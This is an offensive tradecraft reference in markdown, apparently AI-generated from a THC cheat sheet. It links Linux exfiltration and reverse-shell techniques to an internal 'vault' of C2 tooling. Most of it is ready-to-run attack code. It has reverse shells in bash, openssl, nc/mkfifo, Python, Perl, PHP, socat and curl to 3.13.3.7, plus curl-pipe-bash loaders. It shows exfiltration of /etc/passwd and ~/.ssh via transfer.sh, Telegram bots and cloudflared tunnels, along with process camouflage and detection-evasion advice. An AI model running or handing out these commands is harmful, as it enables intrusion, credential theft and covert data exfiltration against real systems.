---
id: RTO-thc-exfil-shells
name: THC Exfiltration & Reverse Shell Tradecraft
source: THC Tips/Tricks/Hacks Cheat Sheet (thc.org)
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-019, T-022, T-023]
tags: [exfiltration, file-transfer, reverse-shell, pty, cloudflared, gs-netcat, curlshell, tmux, screen, webdav, telegram, rsync, openssl, base64, mkfifo, socat, linux, tradecraft]
---

# THC Exfiltration & Reverse Shell Tradecraft — Training Reference

## TL;DR
This module consolidates the THC cheat sheet's data exfiltration and reverse shell tradecraft — covering ~11 file transfer mechanisms (cut & paste, tmux/screen slurp, gs-netcat SFTP, cloudflared-tunneled HTTP/PHP/Python upload servers, curl-less downloads via Python/OpenSSL/Perl/bash, transfer.sh, encrypted rsync, WebDAV, Telegram bots) and ~11 reverse shell variants with PTY upgrade procedures. The vault's networking and exfil capabilities (T-019, T-022, T-023) are Windows-native; this training adds critical **Linux/Unix operator-side tradecraft** for the workstation half of an engagement, plus cross-platform exfil channels that complement the vault's autonomous dead-drop infrastructure.

## Key Concepts

1. **Encoding as Transfer Prerequisite** — Binary files cannot survive cut & paste or terminal logging; THC standardizes four encoders (uuencode, base64, openssl base64, xxd -p) and recommends `xclip` to pipe encoded data straight to clipboard. Vault T-021 covers shellcode encoding (IPv4/IPv6/MAC/UUID/words) for payload transport — different domain, same principle.

2. **Terminal Multiplexer as Exfil Channel** — tmux (`send-keys`) and GNU screen (`readbuf`/`paste`/`logfile`) can be weaponized to move data through an existing interactive session when no new outbound connection is possible. This is operator-side tradecraft not represented in the vault, which assumes programmatic transports (T-022's TCP/HTTP-poll/SOCKS5).

3. **Cloudflare Tunnels as Egress** — `cloudflared tunnel --url localhost:PORT` creates a trycloudflare.com HTTPS front for arbitrary local services (HTTP upload servers, WebDAV, raw TCP via IQ tunnel). This provides a quick exfil endpoint behind Cloudflare's IP space. Complements vault T-019's rentry.co/Sepolia discovery and T-022's HTTP poll transport.

4. **curl-less Downloads (LOtL)** — When `curl` and `wget` are absent, THC ships `purl` (Python urllib), `surl` (openssl s_client), `lurl` (Perl LWP::Simple), and `burl` (bash /dev/tcp). All four are one-liner shell functions. Vault T-020 covers Kaguya LOtL binary inventory — this is the file-acquisition counterpart.

5. **Public Dump Exfil** — transfer.sh and similar services accept `curl -T file https://transfer.sh/name`. THC enumerates "favorite public upload sites". This is the human-operated analog of vault T-019's autonomous dead drop (Google Translate, blockchain, steganography).

6. **Encrypted rsync via socat/openssl** — rsync daemon + OpenSSL self-signed cert + socat OPENSSL-LISTEN provides resumable encrypted directory sync. Windows exfil uses `gs-netcat_x86_64-cygwin` rsync.exe.

7. **WebDAV over Cloudflare Tunnel** — `wsgidav` + cloudflared exposes a drag-and-drop file share accessible from Windows Explorer as `\\host@SSL\path` or `net use * \\host@SSL\path`.

8. **Telegram Bot Exfil** — BotFather token + chat_id retrieval via `getUpdates` → `sendDocument` API. Bypasses corporate egress by using Telegram's API endpoints. Low-cost autonomous C2 channel conceptually similar to vault T-019's blockchain TX dead drop.

9. **PTY/Interactive Shell Upgrades** — Three tiers: `script -qc` (PTY), `python -c 'pty.spawn'` (PTY), and full `stty raw -echo icrnl opost; fg` + `TERM=xterm-256color` + `reset -I` (fully interactive, Ctrl-C safe). socat provides a one-shot equivalent.

10. **Reverse Shell Substrate Options** — Bash `/dev/tcp` (needs Bash), OpenSSL `s_client` (encrypted, no Bash dependency), curl + curlshell (HTTP-encapsulated, proxies OK), remote.moe SSH tunnel (encrypted, NAT-traversal), Python/Perl/PHP one-liners, nc with `-e` or `mkfifo` fallback for embedded systems.

11. **Process Camouflage for Persistence** — `exec -a kqueue bash -i ...` renames the bash process in ps output. Lightweight version of vault T-020's IAT camouflage and self-deletion tradecraft.

## Operational Techniques

### File Encoding (uuencode / base64 / openssl / xxd)
- **What**: Convert binary files to ASCII-safe text for cut & paste transfer.
- **When to use**: Target has no direct internet access; only an interactive terminal session is available.
- **How**:
  ```sh
  # Encode (pick one):
  uuencode /etc/issue.net issue.net-COPY          # writes 'begin 644 ... end' block
  base64 -w0 </etc/issue.net                      # single-line base64
  openssl base64 </etc/issue.net                  # multi-line base64
  xxd -p </etc/issue.net                          # hex string

  # Decode (matching):
  uudecode                                        # paste the uuencoded block, end with EOF
  base64 -d >issue.net-COPY
  openssl base64 -d >issue.net-COPY
  xxd -p -r >issue.net-COPY

  # Clipboard-friendly:
  base64 -w0 </etc/issue.net | xclip
  ```
- **Vault link**: T-021 (Crypto & Obfuscation) — vault covers shellcode encoding formats (IPv4/IPv6/MAC/UUID/words) for payload transport. THC encoding is for arbitrary file exfil; same primitive, different application.
- **Tool/code**: `uuencode`, `uudecode`, `base64`, `openssl base64`, `xxd`, `xclip`
- **OPSEC**: base64/xxd produce easily-detected signatures in DLP/regex sensors. uuencode's `begin 644`/`end` markers are signature-rich. Prefer openssl base64 (multi-line, less obvious) for noisy environments.

### Cut & Paste Transfer (Heredoc)
- **What**: Paste encoded data into a remote file using a quoted heredoc.
- **When to use**: Small files, no new connection possible.
- **How**:
  ```sh
  cat >output.txt <<-'__EOF__'
  [paste encoded content here]
  __EOF__
  ```
  The `<<-'__EOF__'` form preserves tabs and avoids variable expansion.
- **Vault link**: No direct vault equivalent — vault transports are programmatic (T-022 TCP/HTTP-poll).
- **Tool/code**: `cat`, heredoc
- **OPSEC**: Leaves the encoded blob in shell history if not cleaned. Use `HISTFILE=/dev/null` or run inside `unset HISTFILE`.

### tmux File Transfer
- **What**: Use tmux `send-keys` to push base64-encoded data from a local terminal to a remote shell inside a tmux session.
- **When to use**: Operator workstation runs tmux; target is reachable via ssh/gs-netcat inside a tmux pane.
- **How (upload local→remote)**:
  ```sh
  # On remote (rename tmux session to 'foo' via Ctrl-b $):
  base64 -d >screen-xfer.txt

  # On local workstation (different terminal):
  tmux send-keys -t foo "$(base64 -w64 </etc/issue.net)"$'\n'
  # Press Ctrl-d in the receiving terminal when done.
  # Optional: -t foo:1.2 targets window #1 pane #2.
  ```
- **How (download remote→local)**: Use [Tmux-Logging] plugin to capture pane output to a file.
- **Vault link**: None — operator-side technique, not in vault.
- **Tool/code**: `tmux send-keys`, `base64`, tmux-logging plugin
- **OPSEC**: tmux pane content is logged if tmux-logging is enabled on the operator side. Verify `~/.tmux.conf` for `set -g @plugin 'tmux-plugins/tmux-logging'`.

### GNU screen File Transfer
- **What**: Use screen's `readbuf`/`paste`/`logfile` to slurp encoded data through an existing screen session.
- **When to use**: Operator uses screen instead of tmux (legacy systems, BSDs).
- **How (download)**:
  ```sh
  # Inside screen on operator workstation, logged into target:
  #   CTRL-a : logfile screen-xfer.txt
  #   CTRL-a H
  # On target:
  openssl base64 </etc/issue.net
  #   CTRL-a H   (stop logging)
  # On operator:
  openssl base64 -d <screen-xfer.txt
  ```
- **How (upload)**:
  ```sh
  # Operator encodes:
  openssl base64 /etc/issue.net >screen-xfer.txt
  # On target (inside screen):
  openssl base64 -d
  # Inside screen:
  #   CTRL-a : readbuf screen-xfer.txt
  #   CTRL-a : paste .
  #   CTRL-d
  #   CTRL-d   (two Ctrl-d due to openssl issue #9355)
  ```
- **Vault link**: None.
- **Tool/code**: `screen`, `readbuf`, `paste`, `logfile`
- **OPSEC**: Screen logs persist on disk — wipe `screen-xfer.txt` after decoding.

### gs-netcat + SFTP (Encrypted, NAT Traversal)
- **What**: Encapsulate SFTP inside gsocket's encrypted overlay, providing SFTP access to hosts behind NAT/firewall.
- **When to use**: Target behind NAT; operator needs file-level access (not just shell).
- **How**:
  ```sh
  # On target behind NAT:
  gs-netcat -s MySecret -l -e /usr/lib/sftp-server
  # On operator:
  export GSOCKET_ARGS="-s MySecret"
  sftp -D gs-netcat

  # Single-file dump variant:
  # Sender:
  gs-netcat -l <"FILENAME"        # prints a SECRET
  # Receiver:
  gs-netcat >"FILENAME"           # enter SECRET when prompted
  ```
- **Vault link**: T-022 (Network Suite) — vault implements kamui.rs SOCKS5 proxy and juubi.rs peer relay. gs-netcat is conceptually similar (encrypted overlay with NAT traversal) but is a turnkey third-party tool, not custom Rust.
- **Tool/code**: `gs-netcat`, `sftp`, [gsocket](https://github.com/hackerschoice/gsocket)
- **OPSEC**: gsocket traffic uses ephemeral ports and looks like generic TCP to most sensors; the `-s MySecret` secret is the only credential. Rotate secrets per engagement.

### HTTPs File Transfer (Cloudflared-Tunneled)
- **What**: Stand up a temporary HTTP/PHP/Python upload/download server, front it with cloudflared.
- **When to use**: Need a quick exfil endpoint or staged download URL accessible from anywhere.
- **How (download only — read-only file share)**:
  ```sh
  python -m http.server 8080 --bind 127.0.0.1 &
  # alt: php -S 127.0.0.1:8080
  cloudflared tunnel -url localhost:8080
  # Captures trycloudflare.com URL for browser access
  ```
- **How (upload via PHP)**:
  ```sh
  # Receiver:
  curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
  mkdir upload
  (cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
  cloudflared tunnel --url localhost:8080 --no-autoupdate
  # Sender:
  up() { curl -fsSL -F "file=@${1:?}" https://ABOVE-URL-HERE.trycloudflare.com; }
  up warez.tar.gz
  ```
- **How (upload via Python)**:
  ```sh
  # Receiver:
  pip install uploadserver
  python -m uploadserver &
  cloudflared tunnel --url localhost:8000
  # Sender:
  curl -X POST https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
  ```
- **Vault link**: T-022 (HTTP poll transport — `http_poll_transport.rs`) — vault uses HTTP long-poll as a C2 transport channel. THC's cloudflared tunnel is the operator-side counterpart for serving files out-of-band. T-019 (Edo Dead Drop) is conceptually adjacent: autonomous C2 via public services.
- **Tool/code**: `python -m http.server`, `php -S`, `uploadserver` pip package, `cloudflared tunnel`, `curl -F`
- **OPSEC**: cloudflared tunnels terminate on Cloudflare IPs — destination logs will show Cloudflare egress, not the operator's VPS. trycloudflare.com URLs are randomized but predictable in pattern; share via out-of-band channel.

### curl-less Download Functions (purl / surl / lurl / burl)
- **What**: Four shell-function curl replacements using Python/OpenSSL/Perl/bash.
- **When to use**: Target lacks `curl`/`wget` but has another interpreter.
- **How**:
  ```sh
  # Python urllib (TLS verification disabled):
  purl() {
      local url="${1:?}"
      { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
      "$(which python3 || which python || which python2 || which false)" -c "\
  import urllib.request,sys,ssl
  ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
  sys.stdout.buffer.write(urllib.request.urlopen(\"$url\",timeout=10,context=ctx).read())"
  }

  # OpenSSL s_client:
  surl() {
      local r="${1#*://}"; local opts=("-quiet" "-ign_eof")
      IFS=/ read -r host query <<<"${r}"
      openssl s_client --help 2>&1|grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
      openssl s_client --help 2>&1|grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
      echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
        | openssl s_client "${opts[@]}" -connect "${host%%:*}:443" \
        | sed '1,/^\r\{0,1\}$/d'
  }

  # Perl LWP::Simple:
  lurl() {
      local url="${1:?}"
      { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
      perl -e 'use LWP::Simple qw(get); my $url = '"'${1:?}'"'"; print(get $url);'
  }

  # Pure bash /dev/tcp (HTTP only, no TLS):
  burl() {
      IFS=/ read -r proto x host query <<<"$1"
      exec 3<>"/dev/tcp/${host}/${PORT:-80}"
      echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
      (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat) <&3
      exec 3>&-
  }
  ```
- **Vault link**: T-020 (Anti-Analysis — Kaguya LOtL binary inventory) covers living-off-the-land enumeration. These functions are the file-acquisition counterpart. T-022 (WinHTTP staged download — `winhttp_dl.rs`) is the Windows equivalent of `purl`.
- **Tool/code**: `python`, `openssl s_client`, `perl`, bash `/dev/tcp`
- **OPSEC**: purl/surl bypass TLS pinning (`CERT_NONE`, `verify_quiet`). burl is HTTP only — network sensors see cleartext. Each function leaves a per-interpreter process tree footprint.

### transfer.sh Public Dump
- **What**: Shell function wrapping transfer.sh for one-shot file/dir exfil.
- **When to use**: Quick exfil of small-to-medium files; no infrastructure to stand up.
- **How**:
  ```sh
  transfer() {
      [[ $# -eq 0 ]] && { echo >&2 "Usage: transfer [file/dir]"; return 255; }
      [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
      [[ ! -e "$1" ]] && { echo >&2 "Not found: $1"; return 255; }
      [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
      curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
  }
  transfer /etc/passwd
  transfer ~/.ssh
  (curl ipinfo.io; hostname; uname -a; cat /proc/cpuinfo) | transfer "$(hostname)"
  ```
- **Vault link**: T-019 (Edo Dead Drop) — vault implements autonomous dead-drop via Google Translate, Sepolia Ethereum TXs, and steganography. transfer.sh is the simpler human-in-the-loop equivalent; THC lists "favorite public upload sites" (§cloudexfil) as the canonical category.
- **Tool/code**: `curl`, `tar`, [transfer.sh](https://transfer.sh)
- **OPSEC**: Files are publicly accessible by URL — use random or unguessable names. Transfer.sh URLs persist; treat as compromised after upload.

### Encrypted rsync (socat + OpenSSL)
- **What**: Resumable encrypted directory sync through a self-signed TLS wrapper.
- **When to use**: Large directory trees, flaky links, need resume capability.
- **How**:
  ```sh
  # Receiver (target-side; sets up rsync daemon + socat TLS):
  openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
  cat ssl.key ssl.crt >ssl.pem; rm -f ssl.key ssl.crt
  mkdir upload
  socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem \
      EXEC:"rsync --server -logtprR --safe-links --partial upload"

  # Sender (operator):
  IP=1.2.3.4; PORT=31337
  # rsync + socat-ssl:
  up1() {
      rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
  }
  # rsync + openssl s_client:
  up2() {
      rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
  }
  up1 /var/www/./warez
  ```
  Unencrypted quick variant:
  ```sh
  # Receiver:
  echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
  mkdir upload
  rsync --daemon --port=31337 --config=r.conf --no-detach
  # Sender:
  rsync -av warez rsync://1.2.3.4:31337/up
  ```
  Windows exfil: use rsync.exe from `gsocket/bin/gs-netcat_x86_64-cygwin_full.zip`.
- **Vault link**: T-022 (Network Suite — `rikudo.rs` multi-chain vault, `juubi.rs` peer relay). rsync is operator-side; vault transports are programmatic.
- **Tool/code**: `rsync`, `socat`, `openssl req/s_client`, `ed25519` cert
- **OPSEC**: Self-signed cert (`verify=0` on sender) is fine for confidentiality but vulnerable to MITM. For high-value exfil, use a pre-shared CA. rsync daemon log is in `upload/` — clean up after.

### WebDAV over Cloudflare Tunnel
- **What**: Expose a wsgidav WebDAV share via cloudflared; mount on Windows for drag-and-drop.
- **When to use**: Operator wants native Explorer drag-and-drop exfil from a Windows target.
- **How**:
  ```sh
  # Receiver:
  cloudflared tunnel --url localhost:8080 &
  wsgidav --port=8080 --root=. --auth=anonymous

  # From another server (curl):
  curl -T file.dat https://example-foo-bar-lights.trycloudflare.com
  curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources
  find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
  find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}

  # From Windows (drag & drop):
  \\example-foo-bar-lights.trycloudflare.com@SSL\sources
  # Or mount as Z: drive:
  net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
  ```
- **Vault link**: T-022 (HTTP poll transport) — WebDAV is a richer protocol layer on the same cloudflared-tunnel primitive. T-023 (Client Capabilities — `amaterasu.rs` exfil engine) could leverage WebDAV as an output channel.
- **Tool/code**: `wsgidav`, `cloudflared`, `curl -T`, `curl -X MKCOL`, `net use`, Windows Explorer UNC
- **OPSEC**: `--auth=anonymous` allows anyone with the URL to write. Use `--auth=user:pass` for engagements where the URL may leak. WebDAV traffic is HTTPS to Cloudflare edge; the only visible destination is `*.trycloudflare.com`.

### Telegram Bot Exfil
- **What**: Upload files to a Telegram group chat via Bot API.
- **When to use**: Bypass corporate egress allowlists (Telegram API often permitted for chat clients); low-cost autonomous dead-drop.
- **How**:
  ```sh
  # 1. Get bot token from @BotFather.
  # 2. Create group, add bot, retrieve chat_id:
  curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" \
    | jq -r '.result[].message.chat.id' | uniq
  # (If result is empty, remove and re-add the bot to the group.)

  # 3. Upload:
  curl -sF document=@file.zip \
    "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
  ```
- **Vault link**: T-019 (Edo Dead Drop) — vault's autonomous C2 uses Google Translate, Ethereum Sepolia TXs, and steganography as out-of-band channels. Telegram bot API is the same conceptual class: a public service that doubles as a covert exfil/dead-drop channel. Vault's `discovery.rs` could be extended to support Telegram as a discovery vector.
- **Tool/code**: `curl`, `jq`, Telegram Bot API (`sendDocument`, `getUpdates`), @BotFather
- **OPSEC**: Telegram API calls are HTTPS to `api.telegram.org` — appears as chat client traffic. Files uploaded to a chat are retained server-side indefinitely; rotate bot tokens and burn the group after the engagement. File size limits apply (50MB for `sendDocument`).

### Reverse Shell — Bash /dev/tcp
- **What**: One-line bash reverse shell using `/dev/tcp/HOST/PORT`.
- **When to use**: Target has Bash; direct outbound TCP allowed.
- **How**:
  ```sh
  # Listener (operator):
  nc -nvlp 1524
  # Or pwncat-cs:
  pwncat -lp 1524    # press Ctrl-C if stuck on "registered new host", then "back"

  # Target (if current shell is Bash):
  (bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)
  # If current shell is NOT Bash:
  bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
  # Camouflaged as 'kqueue':
  bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &)'
  ```
- **Vault link**: T-022 (TCP transport — `tcp_transport.rs`) — vault's TCP transport is the encrypted, protocol-multiplexed counterpart. THC's bash revshell is the bootstrap layer that gets you to a point where vault tooling can be deployed.
- **Tool/code**: `nc`, `pwncat-cs`, `bash /dev/tcp`, `exec -a` (process rename)
- **OPSEC**: `bash -i` over `/dev/tcp` is cleartext. Always upgrade to encrypted variant (curlshell/openssl) for engagements with active network monitoring. `exec -a kqueue` only renames the process; `lsof -p PID` still reveals the TCP socket.

### Reverse Shell — curlshell (HTTP-Encapsulated, Encrypted)
- **What**: cURL pipes a remote script from operator to bash on target; subsequent I/O flows over HTTP(S).
- **When to use**: Direct TCP blocked; only HTTP/HTTPS egress allowed; target has curl.
- **How**:
  ```sh
  # Operator:
  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
  ./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080

  # Target:
  curl -skfL https://3.13.3.7:8080 | bash
  ```
- **Vault link**: T-022 (HTTP poll transport, malleable C2 — `henge.rs`). curlshell is the bootstrap equivalent; vault's HTTP poll is the production-grade transport with malleable profiles.
- **Tool/code**: [curlshell](https://github.com/SkyperTHC/curlshell), `openssl req`, `curl -skfL`
- **OPSEC**: Self-signed cert with `-skfL` bypasses verification on target. Traffic pattern is HTTPS GET → script body → subsequent POST/GET; indistinguishable from `curl | bash` software installs (very common). Operator IP is exposed in target's HTTPS logs unless fronted by cloudflared.

### Reverse Shell — OpenSSL s_client (Encrypted, No Bash Dep)
- **What**: Reverse shell over `openssl s_client` TLS session.
- **When to use**: Need encryption but no curl/bash `/dev/tcp`; openssl available.
- **How**:
  ```sh
  # Operator:
  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
  openssl s_server -port 1524 -cert cert.pem -key key.pem
  # or: pwncat -lp 1524 --ssl

  # Target (background):
  ({ openssl s_client -connect 3.13.3.7:1524 -quiet </dev/fd/3 3>&- 2>/dev/null | sh 2>&3 >&3 3>&- ; } 3>&1 | : &)
  ```
- **Vault link**: T-022 (TCP transport) — TLS-wrapped transport is the vault's baseline. THC variant is the bootstrap shell.
- **Tool/code**: `openssl s_server`, `openssl s_client`, `pwncat --ssl`
- **OPSEC**: Self-signed cert; `s_client -quiet` suppresses TLS handshake noise. Process appears as `openssl` — common enough on Linux.

### Reverse Shell — cURL Telnet (Cleartext)
- **What**: Use curl's `telnet://` scheme as a bidirectional pipe.
- **When to use**: Only curl available; no concern about cleartext.
- **How**:
  ```sh
  # Operator (ncat multi-listener):
  ncat -kltv 1524
  # Target:
  C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
  ```
- **Vault link**: None direct; bootstrap technique.
- **Tool/code**: `ncat -kltv`, `curl -Ns telnet://`
- **OPSEC**: Cleartext telnet — visible to any network sensor. Use only for initial access when no alternative exists; upgrade immediately.

### Reverse Shell — Without /dev/tcp (nc/mkfifo/telnet)
- **What**: Reverse shell for embedded systems lacking Bash and `/dev/tcp`.
- **When to use**: BusyBox, BSD, Solaris, AIX targets.
- **How**:
  ```sh
  # nc -e (rarely supported):
  nc -e /bin/sh -vn 3.13.3.7 1524

  # nc without -e (uses fd trick):
  { nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
  # Modern shells, shorter:
  { nc 3.13.3.7 1524 </dev/fd/2|sh;} 2>&1|:

  # Old /bin/sh (mkfifo):
  mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io

  # Telnet variant:
  mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io

  # No mkfifo (touch + tail -f):
  touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
  # Don't forget: rm /tmp/.fio
  ```
- **Vault link**: None direct; bootstrap for non-Windows targets.
- **Tool/code**: `nc`, `mkfifo`, `telnet`, `tail -f`
- **OPSEC**: `/tmp/.io` and `/tmp/.fio` are world-readable artifacts — wipe after upgrade. `tail -f` variant spawns a long-running process; check `ps`.

### Reverse Shell — remote.moe via SSH Tunnel
- **What**: Reverse shell tunneled through remote.moe SSH reverse port forward.
- **When to use**: Target has SSH client and outbound 443 only; NAT traversal needed.
- **How**:
  ```sh
  # Operator terminal 1 — create remote.moe tunnel:
  ssh-keygen -q -t rsa -N "" -f .r
  ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
  # Captures address like: uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe

  # Operator terminal 2 — listener:
  nc -vnlp 8080

  # Target (ssh + bash):
  bash -c '(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r; \
    ssh -i /tmp/.r -o StrictHostKeyChecking=no \
    -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 \
    -Nf remote.moe; bash -i &>/dev/tcp/0/31338 0>&1 &)'

  # Target alt (ssh + bash + mkfifo):
  rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && \
    (bash -i</tmp/.p 2>1 | ssh -i /tmp/.r -o StrictHostKeyChecking=no \
    -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 \
    remote.moe>/tmp/.p &)
  ```
- **Vault link**: T-022 (peer relay — `juubi.rs`, multi-chain vault — `rikudo.rs`) — vault's relay infrastructure is conceptually similar (chained transports for NAT traversal) but custom Rust. remote.moe is a turnkey third-party equivalent.
- **Tool/code**: `ssh-keygen`, `ssh -R/-L/-W`, `mkfifo`, [remote.moe](https://remote.moe)
- **OPSEC**: remote.moe is a public service — operator and target both touch `remote.moe` IPs. SSH keys are ephemeral (`-N "" -f /tmp/.r`). The `killall ssh` at start ensures no stale tunnels.

### Reverse Shell — Python / Perl / PHP One-Liners
- **What**: Reverse shell in scripting languages when shell built-ins fail.
- **When to use**: Bash absent; Python/Perl/PHP present.
- **How**:
  ```sh
  # Python:
  python -c 'import socket,subprocess,os;\
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
  s.connect(("3.13.3.7",1524));\
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);\
  p=subprocess.call(["/bin/sh","-i"]);'

  # Perl method 1:
  perl -e 'use Socket;$i="3.13.3.7";$p=1524;\
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
  if(connect(S,sockaddr_in($p,inet_aton($i)))){\
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");\
  exec("/bin/sh -i");};'

  # Perl method 2 (fork + IO::Socket::INET):
  perl -MIO -e '$p=fork;exit,if($p);\
  foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}\
  $c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");\
  STDIN->fdopen($c,r);$~->fdopen($c,w);\
  while(<>){if($_=~ /(.*)/){system $1;}};'

  # PHP:
  php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
  ```
- **Vault link**: None direct; bootstrap techniques.
- **Tool/code**: `python`, `perl`, `php`
- **OPSEC**: All cleartext. Python variant is the most signature-heavy (e.g., `os.dup2` pattern in EDR/YARA rules). Perl method 2's `if($ENV{$key}=~/(.*)/)` is a taint-mode bypass — interesting but loudly Perl-specific.

### PTY Shell Upgrade (script / python pty)
- **What**: Convert a dumb shell to a PTY shell, enabling `sudo`, `top`, `clear`.
- **When to use**: Immediately after any dumb reverse shell lands.
- **How**:
  ```sh
  # Linux (script):
  exec script -qc /bin/bash /dev/null
  # BSD (script):
  exec script -q /dev/null /bin/bash
  # Python:
  exec python -c 'import pty; pty.spawn("/bin/bash")'
  ```
- **Vault link**: None — operator-side Linux tradecraft.
- **Tool/code**: `script -qc`, `python -c 'pty.spawn'`
- **OPSEC**: PTY upgrade is local; no network footprint. Watch for `script` writing to `/dev/null` (logged on some systems as suspicious).

### Full Interactive Shell Upgrade (Ctrl-C Safe)
- **What**: Fully interactive shell with working Ctrl-C, signal handling, terminal sizing.
- **When to use**: Need to run interactive tools (`vim`, `top`, `htop`, `nmap --interactive`).
- **How**:
  ```sh
  # On target, spawn PTY:
  python -c 'import pty; pty.spawn("/bin/bash")'
  # Press Ctrl-Z to suspend.

  # On operator terminal:
  stty raw -echo icrnl opost; fg

  # Back on target:
  export SHELL=/bin/bash
  export TERM=xterm-256color
  reset -I
  stty -echo;printf "\033[18t";read -rdt R;stty sane \
    $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
  # Optional prompt:
  PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
  ```
- **Vault link**: None.
- **Tool/code**: `stty raw -echo icrnl opost`, `reset -I`, ANSI `\033[18t` (terminal size query)
- **OPSEC**: `stty raw -echo` on operator side disables local echo — don't panic if you don't see your keystrokes. `fg` resumes the suspended reverse shell. If the connection drops, terminal is left in raw mode — `stty sane` to recover.

### socat Reverse Shell (Fully Interactive, One-Shot)
- **What**: One-command fully interactive reverse shell via socat.
- **When to use**: Target has socat; skip the stty dance.
- **How**:
  ```sh
  # Operator listener:
  socat file:`tty`,raw,echo=0 tcp-listen:1524
  # Target:
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
  ```
- **Vault link**: None direct; bootstrap.
- **Tool/code**: `socat`
- **OPSEC**: socat binary presence on Linux is itself a soft indicator (less common than nc). Cleartext unless you swap `tcp:` for `openssl:`.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `base64 -w0` / `openssl base64` / `xxd -p` / `uuencode` | Encode binary for terminal-safe transfer | uuencode `begin 644`/`end` is signature-rich; prefer openssl base64 |
| `xclip` | Pipe encoded data to clipboard | Local only; no remote footprint |
| `cat >f <<-'__EOF__'` | Heredoc paste for small file reception | Use `unset HISTFILE` to avoid history |
| `tmux send-keys -t NAME` | Push data into remote tmux pane | Verify tmux-logging plugin state on operator side |
| `screen readbuf` / `paste` / `logfile` | screen equivalent of tmux send-keys | Wipe `screen-xfer.txt` after use |
| `gs-netcat -s SECRET -l -e /usr/lib/sftp-server` | Encrypted SFTP over gsocket overlay | Ephemeral ports, generic TCP signature |
| `python -m http.server 8080 --bind 127.0.0.1` | Standalone read-only file server | Bind 127.0.0.1 + cloudflared = no direct exposure |
